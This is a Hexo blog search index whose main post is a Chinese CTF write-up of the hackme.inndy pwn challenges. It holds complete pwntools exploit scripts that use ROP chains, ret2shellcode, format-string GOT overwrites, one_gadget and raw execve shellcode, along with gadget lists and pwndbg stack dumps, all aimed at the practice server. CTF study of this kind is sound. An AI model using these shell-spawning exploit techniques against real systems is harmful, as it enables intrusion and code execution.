<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[栈溢出总结]]></title>
    <url>%2F2019%2F03%2F29%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F03%2F28%2Fhackme.inndy%E4%B9%8Bpwn%2F</url>
    <content type="text"><![CDATA[title:hackme.inndy之pwncatflagnc 连接直接get shell homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe 这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process('./homework')p = remote('hackme.inndy.tw',7701)call_me = 0x80485FBprint str(call_me)pause()p.recvuntil('What\'s your name? ')p.sendline('n0va')p.recvuntil('4 &gt; dump all numbers\n')p.recvuntil(' &gt; ')p.sendline('1')p.recvuntil('Index to edit: ')p.sendline('14')p.recvuntil('How many? ')p.sendline(str(call_me))p.sendline('0')p.interactive() ROP栈溢出，而且是gets的栈溢出，溢出空间无限，可以随便写，这道题有很多种写法，这里选择system call execve的系统调用号为0xb,eax,放着系统调用号，ebx,ecx,edx分别放着execve的三个参数，先找一波gadget 123450x0806c943 : int 0x800x080b8016 : pop eax ; ret0x080481c9 : pop ebx ; ret0x080de769 : pop ecx ; ret0x0806ecda : pop edx ; ret 于是就可以构造ROP链进入系统 调用了 exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *p = process('./rop')p = remote("hackme.inndy.tw","7704")elf = ELF('./rop')bss_addr = elf.bss()pop_in_ecx = 0x0804b5bapop_eax = 0x080b8016pop_ebx = 0x080481c9pop_ecx = 0x080de769pop_edx = 0x0806ecdaint_0x80 = 0x0806c943payload = 16*'a'payload += p32(pop_ecx) + p32(bss_addr)#分两次将'/bin/sh'写入bss段payload += p32(pop_in_ecx) + '/bin'payload += p32(pop_ecx) + p32(bss_addr+4)payload += p32(pop_in_ecx) + '/sh\x00'payload += p32(pop_eax) + p32(0xb)#bss_addr放着'/bin/sh'做为execve的第一个参数payload += p32(pop_ebx) + p32(bss_addr)payload += p32(pop_ecx) + p32(0)payload += p32(pop_edx) + p32(0)payload += p32(int_0x80)p.sendline(payload)p.interactive() ROP2syscall()是系统调用函数，第一个参数是系统调用号，后面的函数分别为调用函数的参数，查表可知4为write函数的系统调用号，3为read函数的系统调用号，所以 123syscall(4, 1, v4, 42); == write(1,v4,42)syscall(3, 0, &amp;v1, 1024); == read(0,&amp;v1,1024)return syscall(4, 1, &amp;v1, 1024); == return write(1,&amp;v1,1024) read 这里就存在一个很明显的栈溢出了，我们可以控制程序回到syscall的位置，只要将他的4个参数分别设为(b,&#39;/bin/sh&#39;,0,0)就行了 exp: 1234567891011121314151617181920#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./rop2')p = remote("hackme.inndy.tw","7703")elf = ELF('./rop2')bss_addr = elf.bss()syscall = 0x8048320overflow = 0x8048454#先调用read往bss段写入'/bin/sh'payload = 16*'a'payload += p32(syscall) + p32(overflow)payload += p32(3) + p32(0) + p32(bss_addr) + p32(8)p.sendline(payload)p.send('/bin/sh\x00')#调用execve函数get shellpayload = 16*'a'payload += p32(syscall) + p32(0) + p32(0xb) + p32(bss_addr) + p32(0) + p32(0)p.sendline(payload)p.interactive() toooomuch可以看到有一个gets，而且还有一个print_flag函数直接打印flag，溢出跳转就完事了 exp: 123456789from pwn import *# context.log_level = 'debug'# p = process('./toooomuch')p = remote("hackme.inndy.tw","7702")print_flag = 0x804863Bpayload = 28*'a'payload += p32(print_flag)p.sendline(payload)p.interactive() toooomuch-2程序 跟toooomuch一模一样，但是这次要求get shell ，那就不能直接跳到print_flag函数上去了 因为什么保护都没开，所以可以直接ret2shellcode，思路是这样的，先跳到gets函数往bss段写入shellcode，再跳到bss执行shellcode exp: 123456789101112131415from pwn import *context.log_level = 'debug'# p = process('./toooomuch-2')p = remote("hackme.inndy.tw","7702")elf = ELF('./toooomuch-2')bss_addr = elf.bss()gets_addr = elf.plt['gets']shellcode = asm(shellcraft.sh())payload = 28*'a'#----------(覆盖返回地址) ---（gets的返回地址）--（gets的参数）payload += p32(gets_addr) + p32(bss_addr) + p32(bss_addr)p.recvuntil('Give me your passcode: ')p.sendline(payload)p.sendline(shellcode)p.interactive() echo这是一道格式化字符串，直接修改printf_got为system_plt的值就行了，都是已知值，手动修改（当然也可以用工具 : fmtstr_payload(7,{printf_got:system_plt})） exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-# 偏移为7from pwn import *# p = process('./echo')p = remote("hackme.inndy.tw","7711")elf = ELF('./echo')printf_got = elf.got['printf']system_plt = elf.plt['system']print "printf_got--&gt;" + hex(printf_got)print "system_plt--&gt;" + hex(system_plt) #0x8048400pause()payload = p32(printf_got) + p32(printf_got+1) + p32(printf_got+2) + p32(printf_got+3)'''\x00\x84\x04\x08'''payload += '%240c' + '%7$hhn' #0x100-16payload += '%132c' + '%8$hhn' #0x184-0x100payload += '%128c' + '%9$hhn' #0x204-0x184payload += '%4c' + '%10$hhn' #0x208-0x204print payloadpause()p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() echo264位的格式化字符串漏洞，漏点跟echo一样，不过有一些坑需要注意一下 首先是保护开启了PIE，位置无关的可执行程序，即可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可以运行进程。但是低两位字节是固定的，所以可以通过这个泄露出程序的基地址。 64位程序函数地址存在&#39;\x00&#39;截断，所以要将函数地址放在最后（不能用fmtstr_payload这个工具，它只适用于32位） printf处下断查看栈可以看到main+74和libc_start_main+340这两个可以泄漏的地址，偏移分别为41和43，因为开启了PIE，而且后三位不变，所以可以泄漏出程序基地址就是0x555555554a03-0xa03，之后对一切地址的操作都加上这个基地址就是正确的地址了，以及libc_start_main的真实地址0x7ffff7a2d830-240就可以算出偏移，从而得到其它函数的真空地址，比如system，不过这道题我用的是one_gadget一把梭 得到了真实地址和偏移就可以进行写入操作了，修改exit_got表为one_gadget_addr exp: 1234567891011121314151617181920212223242526272829303132333435363738#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p = remote("hackme.inndy.tw","7712")# p = process('./echo2')elf = ELF('./echo2')libc = ELF("./libc-2.23.so.x86_64") #hackme网站下载# libc = elf.libc #本地libc#泄漏 main 地址 p.sendline('%41$p')elf_base = int(p.recv(),16)-0xa03print "elf_base--&gt;" + hex(elf_base)#泄漏 libc_start_main 地址 p.sendline('%43$p')libc_start_main = int(p.recv(),16)-240libc_base = libc_start_main - libc.symbols['__libc_start_main']print "libc_start_main--&gt;" + hex(libc_start_main)# one_gadget = 0xf02a4 + libc_base #本地one_gadgetone_gadget = 0xf0897+libc_base #远程one_gadgetprint "one_gadget--&gt;" + hex(one_gadget)exit_got = elf.got['exit'] + elf_baseprint "exit_got--&gt;" + hex(exit_got)hex_one_gadget = hex(one_gadget)payload1 = 4*'a'+'%'+str(int(hex_one_gadget[-4:],16)-4)+'c%8$hn'+p64(exit_got)# payload1 = '%'+str(int(hex_one_gadget[-4:],16))+'c%10$hn'+p64(exit_got)payload2 = 4*'a'+'%'+str(int(hex_one_gadget[-8:-4],16)-4)+'c%8$hn'+p64(exit_got+2)payload3 = 4*'a'+'%'+str(int(hex_one_gadget[-12:-8],16)-4)+'c%8$hn'+p64(exit_got+4)#下断# point = 0x984+elf_base# point = str(hex(point))# gdb.attach(p,"b *"+point)p.sendline(payload1)sleep(1)p.sendline(payload2)sleep(1)p.sendline(payload3)sleep(1)p.interactive() 这里解释一下4*’a&#39;：是为了最后的p64(exit_got)对齐，gdb下断看一个栈的分布就清楚了 ehco3还是格式化字符串，不过我们的输入不再是在栈中了，是保存在bss段，这就不好操作了，我们需要在栈中找到指向栈的指针来进行操作向栈写入内容（建议先做一下jarvis OJ的lab 9然后再回头来看这题，因为题型差不多，但是lab 9没有下面的蛇皮操作） 不过这题最坑的还是在hardfmt函数前的这个玩意v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));看了大佬的 writeup 这是一个抬栈操作，我们回到汇编去可以看到，在最后esp会减去eax使得整个栈帧往栈顶移了eax，而且eax是个随机数，好在还是有范围的。 测试一下我们可以发现大概的范围： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import randomfor x in xrange(1,50): buf= random.randint(0,0xffffffff) a=16 * (((buf &amp; 0x3039) + 30) / 0x10) print hex(a)----------------------------------------------------------------------------------------------0x400x100x10300x200x30200x300x30300x30100x30200x10100x10100x20200x20200x200x30200x300x300x20400x30500x30500x20300x400x30300x30300x400x20200x30400x10300x30500x10400x400x30300x20300x200x30200x10400x30100x30300x400x20500x500x10200x30200x30300x400x30200x30400x30400x3020 可能的数值有0x10,0x20,0x30,0x40,0x1030,........等等等等，也就是说一个值对应一个栈帧，所以我们只需要确定eax的值就可以确定栈的分布了，在.text:08048774 sub esp, eax下断gdb调试一下： 这一次eax 的值 为0x2050,我把它设为0x20，进去，在printf 下个断点，c一下，就可以看到正确的栈帧了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Breakpoint *0x08048646pwndbg&gt; stack 5000:0000│ esp 0xffffcd00 —▸ 0x804a080 (buff) ◂— &apos;AAAAAAAA\n&apos;... ↓02:0008│ 0xffffcd08 ◂— 0x100003:000c│ 0xffffcd0c ◂— 0x104:0010│ 0xffffcd10 ◂— 0xbd5d204605:0014│ 0xffffcd14 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch06:0018│ 0xffffcd18 —▸ 0xf7ffd918 ◂— 0x007:001c│ 0xffffcd1c ◂— 0x008:0020│ 0xffffcd20 —▸ 0xffffcd5e ◂— 0x3080409:0024│ 0xffffcd24 —▸ 0xf7e0b018 ◂— stosd dword ptr es:[edi], eax0a:0028│ 0xffffcd28 —▸ 0xf7e6021b (setbuffer+11) ◂— add ebx, 0x151de50b:002c│ 0xffffcd2c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0c:0030│ 0xffffcd30 —▸ 0xf7fe77eb (_dl_fixup+11) ◂— add esi, 0x158150d:0034│ 0xffffcd34 ◂— 0x00e:0038│ 0xffffcd38 —▸ 0xffffcd10 ◂— 0xbd5d20460f:003c│ 0xffffcd3c ◂— 0xc7e69f0010:0040│ 0xffffcd40 —▸ 0xffffcda8 ◂— 0x011:0044│ 0xffffcd44 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x112:0048│ ebp 0xffffcd48 —▸ 0xffffcda8 ◂— 0x013:004c│ 0xffffcd4c —▸ 0x804877b (main+236) ◂— mov eax, 014:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d204616:0058│ 0xffffcd58 —▸ 0xf7ed62ac (__close_nocancel+18) ◂— mov ebx, edx17:005c│ 0xffffcd5c —▸ 0x804874a (main+187) ◂— add esp, 0x1018:0060│ 0xffffcd60 ◂— 0x319:0064│ 0xffffcd64 —▸ 0x804a060 (magic) ◂— 0xbd5d20461a:0068│ 0xffffcd68 ◂— 0x41b:006c│ 0xffffcd6c —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a1c:0070│ 0xffffcd70 ◂— 0x80001d:0074│ 0xffffcd74 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db01e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)20:0080│ 0xffffcd80 ◂— 0x1... ↓22:0088│ 0xffffcd88 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;23:008c│ 0xffffcd8c ◂— 0x324:0090│ 0xffffcd90 ◂— 0x25d832425:0094│ 0xffffcd94 ◂— 0xdddfa71b26:0098│ 0xffffcd98 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;27:009c│ 0xffffcd9c ◂— 0xc7e69f0028:00a0│ 0xffffcda0 —▸ 0xffffcdc0 ◂— 0x129:00a4│ 0xffffcda4 ◂— 0x0... ↓2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x102c:00b0│ 0xffffcdb0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓2e:00b8│ 0xffffcdb8 ◂— 0x02f:00bc│ 0xffffcdbc —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1030:00c0│ 0xffffcdc0 ◂— 0x131:00c4│ 0xffffcdc4 —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;) 这里就以0x20的栈帧进行分析了，可以发现几个有用的地址 123456714:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d2046...1e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)...2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x10 偏移分别 为20,21,30,31,43，(这里规定它们分别为fmt20,fmt21,ebp1,ebp2) 而且偏移43处放着的是libc_start_main+247的地址，它的偏移是不变的，所以就可以用来做爆破的标志，来找到我们要的栈帧（exa = 0x20的栈帧） 123456789while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close() 爆破完成之后就可以进行正常的操作了思路如下 ： 通过libc_start_main算出偏移，进而得到system的真实地址 %n操作 30，10偏移处使ebp1指向fmt20，ebp2指向fmt21 %n操作 ebp1使fmt20的内容修改为exit_got 操作 ebp2 使fmt21的内容修改为exit_got+2 %n操作 fmt20 修改exit_got 为system低4位，操作 fmt21 修改exit_got+2为system高4位 发送&#39;/bin/sh&#39;作为system函数的参数 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'elf = ELF('./echo3')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close()libc_start_main = int(data[:-1],16)-247ebp1 = int(p.recv()[:-1],16) #在偏移为 31 (ebp1的偏移为87)print 'libc_start_main--&gt;' + hex(libc_start_main)print 'ebp1--&gt;' + hex(ebp1)fmt20 = ebp1-0x10cfmt21 = ebp1-0x108offset = libc_start_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)print 'libc_system--&gt;' + hex(libc.symbols['system'])pause()# exit_got = elf.got['exit']# print 'exit_got--&gt;' + hex(exit_got)printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)#%n操作 30,31偏移处使ebp1指向 fmt20 ebp2指向 fmt21payload_1 = '%'+str(fmt20&amp;0xffff)+'c%30$hn'payload_1 += '%4c%31$hn'payload_1 += '1111'# gdb.attach(p,"b *0x08048646")# pause()p.sendline(payload_1)#%n操作 ebp1使fmt20内容修改为exit_got,操作 ebp2使fmt21内容修改为exit_got+2payload_2 = '%'+str(printf_got&amp;0xffff)+'c%85$hn'payload_2 += '%2c%87$hn'payload_2 += '2222'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('1111\n')p.sendline(payload_2)#%n操作 fmt20修改exit_got为system低4位 fmt21修改为exit_got+2为system高4位payload_3 = '%'+str((system_addr&gt;&gt;16)&amp;0xff)+'c%20$hhn'payload_3 += '%'+str((system_addr&amp;0xffff)-((system_addr&gt;&gt;16)&amp;0xff))+'c%21$hn' payload_3 += '3333'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('2222\n')p.sendline(payload_3)p.recv()p.recvuntil('3333\n')p.send('/bin/sh\x00')p.interactive() smash-the-stack这题是利用ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：Stack smash 只要将argv[0]覆盖为存放flag的地址即可，在write处下断查看argvp[0]的偏移 1234567891011121314151617181920212223pwndbg&gt; stack 2000:0000│ esp 0xffffcd70 ◂— 0x101:0004│ 0xffffcd74 —▸ 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)02:0008│ 0xffffcd78 ◂— &apos;1111&apos;03:000c│ 0xffffcd7c ◂— 0x004:0010│ 0xffffcd80 ◂— 0x105:0014│ 0xffffcd84 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)06:0018│ ebx ecx 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)07:001c│ 0xffffcd8c ◂— 0xc7f80a3208:0020│ 0xffffcd90 —▸ 0xffffcdb0 ◂— 0x109:0024│ 0xffffcd94 ◂— 0x0... ↓0b:002c│ 0xffffcd9c —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x100c:0030│ 0xffffcda0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0e:0038│ 0xffffcda8 ◂— 0x00f:003c│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1010:0040│ 0xffffcdb0 ◂— 0x111:0044│ 0xffffcdb4 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)12:0048│ 0xffffcdb8 —▸ 0xffffce4c —▸ 0xffffd084 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;13:004c│ 0xffffcdbc ◂— 0x0pwndbg&gt; distance 0xffffce44 0xffffcd880xffffce44-&gt;0xffffcd88 is -0xbc bytes (-0x2f words) exp: 123456789from pwn import *context.log_level = 'debug'# p = process('./smash')p = remote('hackme.inndy.tw',7717)flag_addr = 0x804A060p.recvuntil('the flag')p.sendline(47*'a'+p32(flag_addr))# p.sendline(48*p32(flag_addr))p.interactive() 还有另一种做法就是不用算偏移，直接塞一大把p32(flag_addr)进去，因为只要覆盖到argv[0]的位置就可以了，但是实践表明，如果这个数差偏移太多的话，也是不太行的。（比如上面的塞100个在本地还是可以的，但是远程的话63个以上就已经不正常了，我猜是覆盖到了___stack_chk_fail函数部分导致函数无法正常执行，也就不存在通过___stack_chk_fail函数打印出flag了） onepunch这道题还是挺有趣的，起初看反编译代码不是很理解 v6 跟v4的关系，但是在汇编中就很直观了，v6是地址，v4是写入的内容，也就是任意地址写 还有就是这个程序的text段居然是可写的，结合上面的任意地址写就意味着我们可以修改程序的逻辑实现各种操作，相当于打patch 再看一下main函数：这里对输入的v4进行判断，如果不等于255就跳到400773处，所以我们只需要在这里打patch使其跳到main函数就可以实现无限输入。 1234567.text:0000000000400756 mov rax, [rbp+v6].text:000000000040075A mov edx, [rbp+v4].text:000000000040075D mov [rax], dl.text:000000000040075F ; 14: if ( v4 == 255 ).text:000000000040075F mov eax, [rbp+v4].text:0000000000400762 cmp eax, 0FFh.text:0000000000400767 jnz short loc_400773 这里就需要修改16进制了，IDA-&gt;options 将Number of opcode bytes(non-graph)的值设为16就可以看到汇编对应的16进制数。接下来算偏移，要从0x400769跳跟0x4006f1偏移应该为0x88 = 136，所以第一步就是将0x400768处的0xA修改为0x88 123456p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138') 接下来往text段写入shellcode，写完后再修改0x400768处为shellcode地址即可 完整exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *# p = process('./onepunch')p = remote("hackme.inndy.tw","7718")context.log_level = 'debug'p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138')shell_addr = 0x400790# shellcode = asm(shellcraft.sh())shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" shell_len = len(shellcode)i = 0while i&lt;shell_len: p.recvuntil('Where What?') p.sendline(str(hex(shell_addr+i))) # sleep(0.1) p.sendline(str(ord(shellcode[i]))) i += 1p.recvuntil('Where What?')p.sendline('0x400768')# sleep(0.1)p.sendline('39')p.interactive() tictactoe-1先分析一下程序 ，玩井字棋游戏，赢了就能cat flag不过想影是不可能是，最多平局，所以就需要找漏洞来操作了 这里因为v1可以是负数，所以就成了任意地址写了 每次可以写入一个字节，所以就很容易可以想到，把puts的got表修改成0x08048C46(cat flag的位置)，就可以拿到flag_simple了 exp: 123456789101112131415161718192021222324252627282930313233#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./tictactoe')p = remote("hackme.inndy.tw","7714")puts_got = 0x804B024# -50distance_addr = 0x8048C46p.recvuntil('Play (1)st or (2)nd? ')p.sendline('1')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x46')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-50')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x8c')p.recvuntil('Input move (9 to change flavor): ')# gdb.attach(p,"b *0x08048A71")# pause()p.sendline('-49')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x04')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-48')p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F03%2F03%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
